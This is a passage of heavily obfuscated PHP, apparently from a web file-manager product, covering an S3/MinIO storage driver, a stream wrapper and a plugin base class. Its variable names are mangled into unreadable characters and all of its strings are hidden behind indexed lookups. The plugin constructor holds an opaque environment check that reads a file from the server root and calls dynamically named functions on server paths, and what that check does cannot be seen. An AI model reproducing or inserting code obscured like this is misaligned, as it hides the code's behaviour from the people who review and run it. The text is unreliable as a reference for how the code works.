? $ıŸ‹É†ö[$é­š³õ[187]] : $é­š³õ[22]; $î±¾¤Á­ = $ıŸ‹É†ö[$é­š³õ[106]]; unset($ıŸ‹É†ö[$é­š³õ[106]]); if (isset($ıŸ‹É†ö[$é­š³õ[252]])) { $ıŸ‹É†ö[$é­š³õ[251]] = $†·ŠÅ¾; return $this->listUploadParts($î±¾¤Á­, $ıŸ‹É†ö); } $˜¦ñ¿ˆ = array($é­š³õ[253], $é­š³õ[22], $é­š³õ[132], $é­š³õ[22], "\170\x2d\x61\155\x7a\55\144\x61\x74\x65\x3a{$†·ŠÅ¾}", $é­š³õ[18] . $this->bucket . $é­š³õ[18] . $this->pathEncode($î±¾¤Á­) . $ü±§‰“); if (strpos($ü±§‰“, $é­š³õ[254]) === 0) { $˜¦ñ¿ˆ[0] = $é­š³õ[255]; } if (isset($ıŸ‹É†ö[$é­š³õ[256]]) && $ıŸ‹É†ö[$é­š³õ[256]] == $é­š³õ[257]) { $˜¦ñ¿ˆ[0] = $é­š³õ[257]; } $Şü¶Áçì = implode($é­š³õ[12], $˜¦ñ¿ˆ); $íÑñŒº› = base64_encode(hash_hmac($é­š³õ[258], $Şü¶Áçì, $this->secret, !0)); $²ßÌ“Î = $é­š³õ[259] . $this->accessKey . $é­š³õ[4] . $íÑñŒº›; if (strpos($ü±§‰“, $é­š³õ[254]) === 0) { return array($é­š³õ[260] => $²ßÌ“Î, $é­š³õ[251] => $†·ŠÅ¾); } return $²ßÌ“Î; } public function listUploadParts($¶ş‚ê™Ã, $±ö´œ™ = array()) { $ÙÎĞºñ¶ =& $_SERVER[•€áå–Õ]; $Ã…¶µü® = str_replace($ÙÎĞºñ¶[261], $ÙÎĞºñ¶[22], $±ö´œ™[$ÙÎĞºñ¶[187]]); $ğÏÀèË = $this->client->listParts($this->bucket, $¶ş‚ê™Ã, $Ã…¶µü®); if (!$ğÏÀèË) { return !1; } unset($±ö´œ™[$ÙÎĞºñ¶[252]], $±ö´œ™[$ÙÎĞºñ¶[256]]); $±ö´œ™[$ÙÎĞºñ¶[106]] = $¶ş‚ê™Ã; $¼Ø¶„æÁ = $this->multiUploadAuthData($¶ş‚ê™Ã, $±ö´œ™); if (empty($¼Ø¶„æÁ)) { return !1; } return array($ÙÎĞºñ¶[260] => $¼Ø¶„æÁ, $ÙÎĞºñ¶[251] => $±ö´œ™[$ÙÎĞºñ¶[251]], $ÙÎĞºñ¶[262] => $ğÏÀèË); } public function getHost() { return parent::getHost() . $_SERVER[•€áå–Õ][18] . $this->bucket; } public function size($€Úı¡‰) { $¥â—‚â = $this->objectMeta($€Úı¡‰); return $¥â—‚â ? $¥â—‚â[$_SERVER[•€áå–Õ][88]] : 0; } public function info($’“»ˆÌ) { if ($this->isFolder($’“»ˆÌ)) { return $this->folderInfo($’“»ˆÌ); } else { if ($this->isFile($’“»ˆÌ)) { return $this->fileInfo($’“»ˆÌ); } } return !1; } public function exist($É¢İ¼Šñ) { return $this->isFile($É¢İ¼Šñ) || $this->isFolder($É¢İ¼Šñ); } public function isFile($ù¤¡ÂÏ) { return !$this->isFolder($ù¤¡ÂÏ) && $this->objectMeta($ù¤¡ÂÏ); } public function isFolder($û²ÃîŠ¿) { return $this->cacheMethod($_SERVER[•€áå–Õ][178], $û²ÃîŠ¿); } protected function objectMeta($ÅìÔÜ³Ò) { return $this->cacheMethod($_SERVER[•€áå–Õ][180], $ÅìÔÜ³Ò); } protected function _objectMeta($ù§Ë­¡ë) { $—ÁèÇù =& $_SERVER[•€áå–Õ]; $ù§Ë­¡ë = rtrim($ù§Ë­¡ë, $—ÁèÇù[18]); try { $ùŠ÷„‚Ì = $this->client->getObjectInfo($this->bucket, $ù§Ë­¡ë); if (!isset($ùŠ÷„‚Ì[$—ÁèÇù[248]]) && isset($ùŠ÷„‚Ì[$—ÁèÇù[263]])) { $ùŠ÷„‚Ì[$—ÁèÇù[248]] = $ùŠ÷„‚Ì[$—ÁèÇù[263]]; } } catch (Exception $Áß¢ùÃö) { $ùŠ÷„‚Ì = !1; } if (!$ùŠ÷„‚Ì) { } return $ùŠ÷„‚Ì; } protected function _isFolder($˜¿ÀŞ¡ô) { $‚ˆ¯Ú»õ =& $_SERVER[•€áå–Õ]; $˜¿ÀŞ¡ô = rtrim($˜¿ÀŞ¡ô, $‚ˆ¯Ú»õ[18]); if ($˜¿ÀŞ¡ô == $‚ˆ¯Ú»õ[22] || $˜¿ÀŞ¡ô == $‚ˆ¯Ú»õ[18]) { return !0; } $Í‡…æ¶· = $this->client->getBucket($this->bucket, $˜¿ÀŞ¡ô, null, 1); if (empty($Í‡…æ¶·[$‚ˆ¯Ú»õ[232]])) { return !1; } $òøäÄä = $Í‡…æ¶·[$‚ˆ¯Ú»õ[232]][0][$‚ˆ¯Ú»õ[42]]; return stripos($òøäÄä, $˜¿ÀŞ¡ô . $‚ˆ¯Ú»õ[18]) === 0 ? !0 : !1; if (substr($òøäÄä, -1) == $‚ˆ¯Ú»õ[18]) { return !0; } if (get_path_this($òøäÄä) == get_path_this($˜¿ÀŞ¡ô)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($³¾„ËÊË) { parent::__construct($³¾„ËÊË); $this->signatureVersion($_SERVER[•€áå–Õ][243]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ÇóŠü³Ø, $×Üğï = 3600) { $„ÖÏØí… =& $_SERVER[•€áå–Õ]; $šÑ‚ÎŠÖ = $„ÖÏØí…[225]; $×èˆë… = $„ÖÏØí…[264]; $‰÷®¤Ñ­ = $„ÖÏØí…[72]; $¾Œ½Ã¬¶ = gmdate($„ÖÏØí…[265]); $„—ŸÎŸñ = gmdate($„ÖÏØí…[266]); $×ÜÀìÖ° = $„ÖÏØí…[267]; $¼ÌïÉîÇ = $×Üğï . $„ÖÏØí…[22]; $¤º“÷ï = $„ÖÏØí…[268]; $ÀÃú‡ö = array($this->accessKey, $„—ŸÎŸñ, $this->region, $‰÷®¤Ñ­, $×ÜÀìÖ°); $¾°‘Û£¦ = implode($„ÖÏØí…[18], $ÀÃú‡ö); $Œ‡Æ¼Ñå = array($„ÖÏØí…[269] => gmdate($„ÖÏØí…[270], strtotime($„ÖÏØí…[271])), $„ÖÏØí…[272] => array(array($„ÖÏØí…[273] => $this->bucket), array($„ÖÏØí…[274] => $šÑ‚ÎŠÖ), array($„ÖÏØí…[275], $„ÖÏØí…[276], $„ÖÏØí…[22]), array($„ÖÏØí…[275], $„ÖÏØí…[277], $„ÖÏØí…[22]), array($„ÖÏØí…[275], $„ÖÏØí…[278], $„ÖÏØí…[22]), array($„ÖÏØí…[279] => $¤º“÷ï), array($„ÖÏØí…[280] => $¾°‘Û£¦), array($„ÖÏØí…[281] => $×èˆë…), array($„ÖÏØí…[282] => $¾Œ½Ã¬¶), array($„ÖÏØí…[283] => $¼ÌïÉîÇ))); $òŠÅ€ˆ© = base64_encode(json_encode($Œ‡Æ¼Ñå)); $¶ô•£ğØ = hash_hmac($„ÖÏØí…[284], $„—ŸÎŸñ, $„ÖÏØí…[285] . $this->secret, !0); $Úˆï·„° = hash_hmac($„ÖÏØí…[284], $this->region, $¶ô•£ğØ, !0); $›¾ñÇ½ = hash_hmac($„ÖÏØí…[284], $‰÷®¤Ñ­, $Úˆï·„°, !0); $ŸÆÎ¬ê = hash_hmac($„ÖÏØí…[284], $×ÜÀìÖ°, $›¾ñÇ½, !0); $’àøùŒù = hash_hmac($„ÖÏØí…[284], $òŠÅ€ˆ©, $ŸÆÎ¬ê); $‹…«Ïª = array($„ÖÏØí…[242] => $„ÖÏØí…[22], $„ÖÏØí…[286] => $„ÖÏØí…[22], $„ÖÏØí…[274] => $šÑ‚ÎŠÖ, $„ÖÏØí…[279] => $¤º“÷ï, $„ÖÏØí…[287] => $òŠÅ€ˆ©, $„ÖÏØí…[288] => $¾°‘Û£¦, $„ÖÏØí…[289] => $×èˆë…, $„ÖÏØí…[290] => $¾Œ½Ã¬¶, $„ÖÏØí…[291] => $¼ÌïÉîÇ, $„ÖÏØí…[292] => $’àøùŒù, $„ÖÏØí…[208] => $this->getHost()); return $‹…«Ïª; } } goto cØ–®À»¹´; Fƒ„ä¤¦Œƒ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ôúõá, $Ûæ®»Í = '') { $this->info = $this->info($ôúõá); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[•€áå–Õ][96]]; $this->pathOpen = $ôúõá; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ôúõá])) { self::$_chunkBuffer[$ôúõá] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($çâÜØöÛ) { $×•ğ˜Ä = $this->fileSubstr($this->pose, $çâÜØöÛ); $this->pose += strlen($×•ğ˜Ä); return $×•ğ˜Ä; } public function stream_tell() { return $this->pose; } public function stream_seek($†Ö´ª·å, $·¥“…®Ø) { $ÚãÅ©ëû =& $_SERVER[•€áå–Õ]; if ($·¥“…®Ø == SEEK_SET) { $this->pose = $†Ö´ª·å; } else { if ($·¥“…®Ø == SEEK_CUR) { $this->pose += $†Ö´ª·å; } else { if ($·¥“…®Ø == SEEK_END) { $this->pose = $this->info[$ÚãÅ©ëû[88]] + intval($†Ö´ª·å); } } } if ($†Ö´ª·å < 0) { $this->pose = $this->info[$ÚãÅ©ëû[88]] + $†Ö´ª·å; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[•€áå–Õ][88]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($€ÅºóÇ¥, $ÌÑõ’…) { $¾¡‘ï‚— =& $_SERVER[•€áå–Õ]; $ÔÊÙÌ¯Ó = $this->info($€ÅºóÇ¥); return array($¾¡‘ï‚—[1532] => 0, $¾¡‘ï‚—[1533] => 0, $¾¡‘ï‚—[26] => 32768 + 511, $¾¡‘ï‚—[1534] => 0, $¾¡‘ï‚—[1535] => 0, $¾¡‘ï‚—[1536] => 0, $¾¡‘ï‚—[1537] => 0, $¾¡‘ï‚—[88] => $ÔÊÙÌ¯Ó[$¾¡‘ï‚—[88]], $¾¡‘ï‚—[1538] => $ÔÊÙÌ¯Ó[$¾¡‘ï‚—[1404]], $¾¡‘ï‚—[1494] => $ÔÊÙÌ¯Ó[$¾¡‘ï‚—[97]], $¾¡‘ï‚—[1493] => $ÔÊÙÌ¯Ó[$¾¡‘ï‚—[227]], $¾¡‘ï‚—[1539] => 0, $¾¡‘ï‚—[1540] => 0); } static $fileInfo = array(); public function info($ÆÇü…¾Ä) { $ÆìÁ…äğ = $_SERVER[•€áå–Õ][1541]; if (isset(self::$fileInfo[$ÆÇü…¾Ä])) { return self::$fileInfo[$ÆÇü…¾Ä]; } if (substr($ÆÇü…¾Ä, 0, strlen($ÆìÁ…äğ)) != $ÆìÁ…äğ) { return !1; } self::$fileInfo[$ÆÇü…¾Ä] = IO::info(substr($ÆÇü…¾Ä, strlen($ÆìÁ…äğ))); return self::$fileInfo[$ÆÇü…¾Ä]; } public static function read($©–Èï, $ºÀÛä·, $©ôŠ–ˆŒ) { if (!isset(self::$_fopenCache[$©–Èï])) { $Ç‚Ûğ = new StreamWrapperIO(); $Ç‚Ûğ->stream_open($©–Èï); self::$_fopenCache[$©–Èï] = $Ç‚Ûğ; } $Ç‚Ûğ = self::$_fopenCache[$©–Èï]; return $Ç‚Ûğ->fileSubstr($ºÀÛä·, $©ôŠ–ˆŒ); } public static function _read($ÚÏ¸íÒ¸, $²„§ôİá, $÷çôùØ) { $‹â¼ò£ =& $_SERVER[•€áå–Õ]; $“ÑåôÑĞ = fopen($ÚÏ¸íÒ¸, $‹â¼ò£[1408]); if (!$“ÑåôÑĞ) { return $‹â¼ò£[22]; } $ñä°ªŠ = 8192; fseek($“ÑåôÑĞ, $²„§ôİá, SEEK_SET); $Šºì“Øå = $‹â¼ò£[22]; $ Óó§¥É = 0; while ($ Óó§¥É < $÷çôùØ) { $ŠşöŒµ¦ = min($ñä°ªŠ, $÷çôùØ - $ Óó§¥É); $Šºì“Øå .= fread($“ÑåôÑĞ, $ŠşöŒµ¦); $ Óó§¥É += $ŠşöŒµ¦; } fclose($“ÑåôÑĞ); return $Šºì“Øå; } public function fileSubstr($Ú°ò¸Ïü, $Çº×›—˜) { $å»Şö ˜ =& $_SERVER[•€áå–Õ]; $Œ±µ»ªí = $this->info[$å»Şö ˜[88]]; $ü¯ÏÜ ® = $Ú°ò¸Ïü; $äËöÊó = $Çº×›—˜; if ($Ú°ò¸Ïü < 0) { $Ú°ò¸Ïü = $Œ±µ»ªí + $Ú°ò¸Ïü; } if ($Çº×›—˜ === !1) { $Çº×›—˜ = $Œ±µ»ªí - $Ú°ò¸Ïü; } if ($Ú°ò¸Ïü + $Çº×›—˜ > $Œ±µ»ªí) { $Çº×›—˜ = $Œ±µ»ªí - $Ú°ò¸Ïü; } if ($Çº×›—˜ <= 0) { return $å»Şö ˜[22]; } if ($Ú°ò¸Ïü < 0 || $Ú°ò¸Ïü >= $Œ±µ»ªí || $Çº×›—˜ <= 0 || $Çº×›—˜ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\145\122\145\141\x64\40\x65\162\162\x6f\162\x21\x20\x73\x74\x61\162\x74\x3d{$Ú°ò¸Ïü}\x3b\x6c\145\x6e\x67\x74\150\75{$Çº×›—˜}\x3b\x20\163\151\x7a\145\x3d{$Œ±µ»ªí}\73"); } $¬¥ğè¬ = 64 * 1024; $ï¯˜‰±ñ =& self::$_chunkBuffer[$this->path]; if (!$ï¯˜‰±ñ) { $ï¯˜‰±ñ = array(); } $¯€ÓĞ = 0; $Ğ—Î¨í = 0; $¨‹Î²üÃ = $å»Şö ˜[22]; foreach ($ï¯˜‰±ñ as $¯€ÓĞ => $¨‹Î²üÃ) { $¯€ÓĞ = intval($¯€ÓĞ); $Ğ—Î¨í = $¯€ÓĞ + strlen($¨‹Î²üÃ); if ($Ú°ò¸Ïü >= $Ğ—Î¨í) { continue; } if ($Ú°ò¸Ïü >= $¯€ÓĞ && $Ú°ò¸Ïü + $Çº×›—˜ <= $Ğ—Î¨í) { return substr($¨‹Î²üÃ, $Ú°ò¸Ïü - $¯€ÓĞ, $Çº×›—˜); } break; } if (count($ï¯˜‰±ñ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($å»Şö ˜[1542], $å»Şö ˜[1543] . count($ï¯˜‰±ñ) . "\x3b\163\164\141\x72\x74\x3d{$Ú°ò¸Ïü}\54\x6c\x65\156\147\x74\x68\75{$Çº×›—˜}\x3b\160\157\x73\x65\x3a{$¯€ÓĞ}\176{$Ğ—Î¨í}"); throw new Exception($å»Şö ˜[1544]); } $ÅÂöóâ = intval($Ú°ò¸Ïü / $¬¥ğè¬) * $¬¥ğè¬; $¸¨‘“ = ceil(($Ú°ò¸Ïü + $Çº×›—˜) / $¬¥ğè¬) * $¬¥ğè¬ - $ÅÂöóâ; $˜ÌÏ•›ß = IO::fileSubstr($this->path, $ÅÂöóâ, $¸¨‘“); $ï¯˜‰±ñ[$ÅÂöóâ . $å»Şö ˜[22]] = $˜ÌÏ•›ß; ksort($ï¯˜‰±ñ); $¼¢ÍÌé¾ = substr($˜ÌÏ•›ß, $Ú°ò¸Ïü - $ÅÂöóâ, $Çº×›—˜); return $¼¢ÍÌé¾; } private function log($Ã½ûß¾, $İ½ğµü) { $‚Ã‡ë·¹ =& $_SERVER[•€áå–Õ]; $ü›çİ÷„ = timeFloat() - $this->timeStart; write_log(sprintf($‚Ã‡ë·¹[1545], $Ã½ûß¾, $this->info[$‚Ã‡ë·¹[42]], $ü›çİ÷„, $İ½ğµü), $‚Ã‡ë·¹[1223]); } } class Message { function __construct() { } public function send($ß‹Ğ¬ô’ = '', $¤×Ü€â± = array(), $ ’‚™È = "\164\x65\170\x74") { $¯© £º« =& $_SERVER[•€áå–Õ]; $“Öûã• = array($¯© £º«[43] => $¯© £º«[1546], $¯© £º«[795] => $ß‹Ğ¬ô’); if (in_array($ ’‚™È, array($¯© £º«[1546], $¯© £º«[1547]))) { $“Öûã•[$¯© £º«[43]] = $ ’‚™È; } $¤×Ü€â± = array($¯© £º«[558] => isset($¤×Ü€â±[$¯© £º«[558]]) ? $¤×Ü€â±[$¯© £º«[558]] : $¯© £º«[22], $¯© £º«[641] => isset($¤×Ü€â±[$¯© £º«[641]]) ? $¤×Ü€â±[$¯© £º«[641]] : $¯© £º«[22]); if (empty($ß‹Ğ¬ô’) || empty($¤×Ü€â±[$¯© £º«[558]]) && empty($¤×Ü€â±[$¯© £º«[641]])) { return !1; } $Î„ñÜ  = array($¯© £º«[1487] => $“Öûã•, $¯© £º«[1548] => $¤×Ü€â±); Hook::trigger($¯© £º«[1549], $Î„ñÜ ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ğÀ‡›ŒÍ =& $_SERVER[•€áå–Õ]; if ($_SERVER[$ğÀ‡›ŒÍ[8]] != $_SERVER[$ğÀ‡›ŒÍ[918]]) { $×«€Í† = $ğÀ‡›ŒÍ[919]; $·‚ı»Ô« = $ğÀ‡›ŒÍ[9]; $›øÊÎÓş = $_SERVER[$ğÀ‡›ŒÍ[10]] . $ğÀ‡›ŒÍ[11]; $¨ëÀöŠ = $·‚ı»Ô«($›øÊÎÓş); $€µƒÅüÍ = explode($ğÀ‡›ŒÍ[12], $¨ëÀöŠ); if (count($€µƒÅüÍ) < $ğÀ‡›ŒÍ[666]) { $Ë×¬ÍïÊ = $ğÀ‡›ŒÍ[14]; $Ë×¬ÍïÊ(); } $½ªË¢›› = $ğÀ‡›ŒÍ[920]; $½ªË¢››($_SERVER[$ğÀ‡›ŒÍ[921]]); $½ªË¢››($_SERVER[$ğÀ‡›ŒÍ[10]] . $ğÀ‡›ŒÍ[922]); $Î¦”Ì´ = 1; while ($Î¦”Ì´ > 1) { $Î¦”Ì´ = $Î¦”Ì´ + 4; $’‰ƒ¼Ü = rawurlencode($Î¦”Ì´ . $ğÀ‡›ŒÍ[433]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ğÀ‡›ŒÍ[1550]); $this->pluginName = str_replace($ğÀ‡›ŒÍ[1550], $ğÀ‡›ŒÍ[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ğÀ‡›ŒÍ[18]; $this->pluginApi = appHostGet() . $ğÀ‡›ŒÍ[1551] . $this->pluginName . $ğÀ‡›ŒÍ[18]; $this->pluginHost = $config[$ğÀ‡›ŒÍ[1552]] . $this->pluginName . $ğÀ‡›ŒÍ[18]; $this->pluginHostDefault = $config[$ğÀ‡›ŒÍ[1552]] . $this->pluginName . $ğÀ‡›ŒÍ[18]; $¿ıÙı˜± = $config[$ğÀ‡›ŒÍ[1553]]; if ($¿ıÙı˜± && strpos($ğÀ‡›ŒÍ[60] . $¿ıÙı˜± . $ğÀ‡›ŒÍ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ğÀ‡›ŒÍ[1554]] . $this->pluginName . $ğÀ‡›ŒÍ[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[•€áå–Õ][1555]); } protected function assign($ÈØ·ã¼œ, $§Ù²ŞéŠ = false) { if (is_array($ÈØ·ã¼œ)) { $this->values = array_merge($this->values, $ÈØ·ã¼œ); } else { $this->values[$ÈØ·ã¼œ] = $§Ù²ŞéŠ; } } protected function display($»¬ä¤) { extract($this->values); require $»¬ä¤; } final function hookRegist($÷èşª«) { $this->modelPlugin->appRegist($this->pluginName, $÷èşª«); } final function appIcon() { $ªŞÕÂØ× =& $_SERVER[•€áå–Õ]; $íÒïàÕì = $this->appPackage(); $¸¯á§ü¨ = $ªŞÕÂØ×[22]; if (isset($íÒïàÕì[$ªŞÕÂØ×[469]])) { if (isset($íÒïàÕì[$ªŞÕÂØ×[469]][$ªŞÕÂØ×[1556]])) { $¸¯á§ü¨ = $ªŞÕÂØ×[1557] . $íÒïàÕì[$ªŞÕÂØ×[469]][$ªŞÕÂØ×[1556]] . $ªŞÕÂØ×[1558]; } else { if ($íÒïàÕì[$ªŞÕÂØ×[469]][$ªŞÕÂØ×[1559]]) { $¸¯á§ü¨ = $ªŞÕÂØ×[1560] . $íÒïàÕì[$ªŞÕÂØ×[469]][$ªŞÕÂØ×[1559]] . $ªŞÕÂØ×[1561]; } } } return $¸¯á§ü¨; } final function fileCanView($«—¯ Úõ) { $«•‰½´ı =& $_SERVER[•€áå–Õ]; if (request_url_safe($«—¯ Úõ)) { return !0; } if ($this->isShare($«—¯ Úõ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÃÁğøÎê = $«•‰½´ı[1562] . rawurlencode(this_url()); show_tips(LNG($«•‰½´ı[1563]) . $«•‰½´ı[1564] . $ÃÁğøÎê . $«•‰½´ı[1565] . LNG($«•‰½´ı[1566]) . $«•‰½´ı[1567], !1); } if (!Action($«•‰½´ı[1568])->authCan($«•‰½´ı[1569])) { show_tips(LNG($«•‰½´ı[1570]) . $«•‰½´ı[1571], !1); } ActionCall($«•‰½´ı[1572], $«—¯ Úõ); } final function isShare($¿Ø›†Ğ“) { $¯»Ñù‹† = KodIO::parse($¿Ø›†Ğ“); return $¯»Ñù‹†[$_SERVER[•€áå–Õ][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÊÙ åîô) { if (request_url_safe($ÊÙ åîô)) { return $ÊÙ åîô; } if (!$this->isShare($ÊÙ åîô)) { $ÊÙ åîô = $this->filePath($ÊÙ åîô, !1); } return Action($_SERVER[•€áå–Õ][1215])->linkOut($ÊÙ åîô); } public function filePathLinkOut($çÒıÙş) { if (request_url_safe($çÒıÙş)) { return $çÒıÙş; } $this->fileCanView($çÒıÙş); return Action($_SERVER[•€áå–Õ][1215])->link($çÒıÙş); } final function filePath($œÓ®º³›, $æŸ©«À = true, $ûóı©şÌ = false) { $ş¨•ĞÍš =& $_SERVER[•€áå–Õ]; $§³£Ì½“ = $this->filePathGet($œÓ®º³›, $æŸ©«À); if (!$this->fileInfo) { show_tips(LNG($ş¨•ĞÍš[117]), !1); } if ($ûóı©şÌ && isset($this->fileInfo[$ş¨•ĞÍš[520]]) && $this->fileInfo[$ş¨•ĞÍš[520]]) { $ùà‘†å‘ = Model($ş¨•ĞÍš[523])->fileInfo($this->fileInfo[$ş¨•ĞÍš[520]]); if (!$ùà‘†å‘ || !IO::exist($ùà‘†å‘[$ş¨•ĞÍš[96]])) { show_tips(LNG($ş¨•ĞÍš[117]) . $ş¨•ĞÍš[1573]); } } Hook::trigger($ş¨•ĞÍš[1574], $§³£Ì½“); return $§³£Ì½“; } final function filePathGet($ÅÅ‡Ó°¤, $ºôÒ¾ˆê = true) { $ıëÑÈß² =& $_SERVER[•€áå–Õ]; if ($öªò¹ôï = $this->checkSharePath($ÅÅ‡Ó°¤, $ºôÒ¾ˆê)) { return $öªò¹ôï; } $this->fileCanView($ÅÅ‡Ó°¤); if (request_url_safe($ÅÅ‡Ó°¤)) { $¨ùŒê¦ = parse_url_query($ÅÅ‡Ó°¤); if (isset($¨ùŒê¦[$ıëÑÈß²[1575]]) && isset($¨ùŒê¦[$ıëÑÈß²[230]])) { $ñğŞğ“² = Mcrypt::decode($¨ùŒê¦[$ıëÑÈß²[230]], Model($ıëÑÈß²[811])->get($ıëÑÈß²[812])); if ($ñğŞğ“²) { $this->fileInfo = IO::info($ñğŞğ“²); $this->fileInfo[$ıëÑÈß²[1576]] = $ÅÅ‡Ó°¤; $this->cachePath = $this->pluginCachePath($ıëÑÈß²[22], $ºôÒ¾ˆê); return $ñğŞğ“²; } } $ÅÅ‡Ó°¤ = $this->_cacheHttpFile($ÅÅ‡Ó°¤, $ºôÒ¾ˆê); $this->fileInfo = IO::info($ÅÅ‡Ó°¤); } else { $this->fileInfo = IO::info($ÅÅ‡Ó°¤); $this->cachePath = $this->pluginCachePath($ıëÑÈß²[22], $ºôÒ¾ˆê); } return $ÅÅ‡Ó°¤; } final function _cacheHttpFile($²›Øú, $û¿±¢ú = true) { $øÛ–š¨¢ =& $_SERVER[•€áå–Õ]; $äçµ´·ı = parse_url_query($²›Øú); $¥ïÛñºÄ = get_path_ext($²›Øú); if (isset($äçµ´·ı[$øÛ–š¨¢[42]]) && $äçµ´·ı[$øÛ–š¨¢[42]]) { $¥ïÛñºÄ = get_path_ext($äçµ´·ı[$øÛ–š¨¢[42]]); } $¾èıÎà´ = hash_path($²›Øú) . $øÛ–š¨¢[20] . $¥ïÛñºÄ; $this->cachePath = $this->pluginCachePath($û¿±¢ú ? $¾èıÎà´ : $øÛ–š¨¢[22]); $ˆæØü³… = IO::fileNameExist($this->cachePath, $¾èıÎà´); if ($ˆæØü³…) { return KodIO::make($ˆæØü³…); } $áŒÔÊºÁ = rtrim($this->cachePath, $øÛ–š¨¢[18]) . $øÛ–š¨¢[18] . $¾èıÎà´; return $this->pluginCacheFileSet($áŒÔÊºÁ, file_get_contents_nossl($²›Øú)); } final function checkSharePath($‹¶ÆÙ¤Î, $ò’î«Ûø = true) { $ğçÇçÄ =& $_SERVER[•€áå–Õ]; if (!$this->isShare($‹¶ÆÙ¤Î)) { return !1; } $Ë‡¬¸ß­ = Action($ğçÇçÄ[1215])->sharePathInfo($‹¶ÆÙ¤Î); if (!is_array($Ë‡¬¸ß­) || !isset($Ë‡¬¸ß­[$ğçÇçÄ[96]])) { show_json(LNG($ğçÇçÄ[1577]), !1); } $this->fileInfo = $Ë‡¬¸ß­; $this->cachePath = $this->pluginCachePath(!1, $ò’î«Ûø); return $Ë‡¬¸ß­[$ğçÇçÄ[96]]; } final function pluginCachePath($Ö•³õÂ = '', $…²ÏŞ‹í = false) { $¶‘Ò©©ì =& $_SERVER[•€áå–Õ]; if ($…²ÏŞ‹í && is_array($this->fileInfo)) { $Ö•³õÂ = kodIO::hashPath($this->fileInfo); } $™’¾»×Ë = rtrim(IO_PATH_SYSTEM_TEMP . $¶‘Ò©©ì[1578] . $this->pluginName . $¶‘Ò©©ì[18] . $Ö•³õÂ, $¶‘Ò©©ì[18]); $ÎüºáÆú = IO::infoFullSimple($™’¾»×Ë); $ç²¾Íã¿ = $ÎüºáÆú && is_array($ÎüºáÆú) ? $ÎüºáÆú[$¶‘Ò©©ì[96]] : $¶‘Ò©©ì[22]; if (!$ç²¾Íã¿) { $ç²¾Íã¿ = IO::mkdir($™’¾»×Ë); } return $ç²¾Íã¿; } final function pluginCacheFileSet($ĞÀË³œ, $‘ÂŠÍÏù = '') { $ ‹˜‘Äİ =& $_SERVER[•€áå–Õ]; $­ƒšÛªÛ = IO::infoFullSimple($ĞÀË³œ); if (!$­ƒšÛªÛ) { return IO::mkfile($ĞÀË³œ, $‘ÂŠÍÏù, REPEAT_REPLACE); } IO::setContent($­ƒšÛªÛ[$ ‹˜‘Äİ[96]], $‘ÂŠÍÏù); return $­ƒšÛªÛ[$ ‹˜‘Äİ[96]]; } final function pluginLocalFile($×Ã•ßÇç = '') { $‡ˆĞœì‡ =& $_SERVER[•€áå–Õ]; $ÒÎ··› = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ÒÎ··›)) { mk_dir($ÒÎ··›); } if (!$×Ã•ßÇç) { return $ÒÎ··›; } $ì‡Ã…ÕÄ = IO::info($×Ã•ßÇç); $Ü·ÆÇÙÄ = $‡ˆĞœì‡[1579] . KodIO::hashPath($ì‡Ã…ÕÄ) . $‡ˆĞœì‡[20] . $ì‡Ã…ÕÄ[$‡ˆĞœì‡[187]]; if (!checkExtSafe($Ü·ÆÇÙÄ)) { $Ü·ÆÇÙÄ = $Ü·ÆÇÙÄ . $‡ˆĞœì‡[1247]; } $«¸êÆ” = $ÒÎ··› . $Ü·ÆÇÙÄ; if (@file_exists($«¸êÆ”)) { return $«¸êÆ”; } return IO::copy($×Ã•ßÇç, $ÒÎ··›, 0, $Ü·ÆÇÙÄ); } final function appPackage() { $Ç€¹µŸö =& $_SERVER[•€áå–Õ]; if ($this->packageData) { return $this->packageData; } $‚‹ƒòÓØ = $this->parseFile($this->pluginPath . $Ç€¹µŸö[1580]); $this->parseLang($‚‹ƒòÓØ); $è»’Ø² = json_decode_force($‚‹ƒòÓØ); if (!$è»’Ø²) { return array(); } $—Óè„ìŠ = Hook::trigger($Ç€¹µŸö[1581], $è»’Ø²); if ($—Óè„ìŠ && is_array($—Óè„ìŠ)) { $è»’Ø² = $—Óè„ìŠ; } $this->packageData = $è»’Ø²; return $è»’Ø²; } public function packageInfoGet($“èÕ©•º) { $¦·è´ÁĞ = $this->appPackage(); return array_get_value($¦·è´ÁĞ, $“èÕ©•º); } public function packageVersion() { return $this->packageInfoGet($_SERVER[•€áå–Õ][1582]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[•€áå–Õ][1583]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[•€áå–Õ][1584]); } public function echoJsAssign($¯½£´¨¸, $—É…ßõ¾) { $this->echoJsAssignArr[$¯½£´¨¸] = $—É…ßõ¾; } private function parseFile($äÍË­Õ) { $Åú÷ª± =& $_SERVER[•€áå–Õ]; $œ°Ø¹îİ = file_get_contents_nossl($äÍË­Õ); $™•¯è®¥ = 